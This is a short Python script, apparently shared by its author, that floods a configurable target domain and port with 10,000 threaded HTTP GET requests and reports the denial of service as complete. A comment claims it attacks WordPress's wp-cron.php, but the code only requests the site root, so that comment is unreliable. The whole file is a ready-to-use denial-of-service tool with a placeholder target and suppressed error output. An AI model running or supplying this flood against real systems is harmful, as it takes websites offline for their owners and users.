################ Author = SrPatoMan ################
### Linkedin: https://www.linkedin.com/in/manuel-ramos-martin-769405308/

import socket
import threading
import sys

##### CHANGE THIS #####


target_addr = 'example.com' # Target domain
target_port = 80 # Target port
total_requests = 10000 # Total requests number

sys.stderr = open("/dev/null", "w")

# Client socket
socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Performing a DoS via wp-cron.php 

def DoS():
    
    socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket_cliente.connect((target_addr, target_port))
    socket_cliente.send(f"GET / HTTP/1.1\r\nHost: {target_addr}\r\n\r\n".encode())
    socket_cliente.close()

# Threads

hilos = []

for _ in range(total_requests):
    hilo = threading.Thread(target=DoS)
    hilo.start()
    hilos.append(hilo)




for hilos_terminados in hilos:
    hilos_terminados.join()


print("\n\n[+] DoS completado con exito\n\n")
